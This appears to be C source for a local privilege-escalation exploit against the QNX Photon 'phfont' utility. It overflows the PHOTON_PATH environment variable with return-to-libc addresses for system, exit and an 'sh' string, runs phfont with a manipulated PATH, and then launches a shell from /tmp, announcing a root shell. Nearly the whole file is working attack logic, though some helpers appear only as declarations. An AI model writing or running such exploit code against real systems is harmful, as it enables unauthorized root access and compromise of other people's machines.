
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int env ;


 char* FILENAME ;
 char* HEADER ;
 int OFFSET ;
 int createshell () ;
 unsigned int find_libc (char*) ;
 unsigned int find_string (char*) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int printf (char*,...) ;
 int setenv (char*,char*,int ) ;
 int sleep (int) ;
 int system (char*) ;
 scalar_t__ unlink (char*) ;

int
main(int argc, char **argv)
{
 unsigned int system_addr;
 unsigned int exit_addr;
 unsigned int sh_addr;

 char env[440];

 printf("%s\n\n", HEADER);

 createshell();

 system_addr = find_libc("system");
 exit_addr = find_libc("exit");
 sh_addr = find_string("sh");

 memset(env, 0xEB, sizeof(env));
 memcpy(env + OFFSET, (char *)&system_addr, 4);
 memcpy(env + OFFSET + 4, (char *)&exit_addr, 4);
 memcpy(env + OFFSET + 8, (char *)&sh_addr, 4);

 setenv("PHOTON_PATH", env, 0);
 system("PATH=/tmp:/bin:/sbin:/usr/bin:/usr/sbin /usr/photon/bin/phfont");

 printf("[-] now dropping into root shell...\n");

 sleep(2);
 if (unlink(FILENAME) != 0)
  printf("error: cannot unlink %s\n", FILENAME);

 system("/tmp/shell");

 return(0);
}
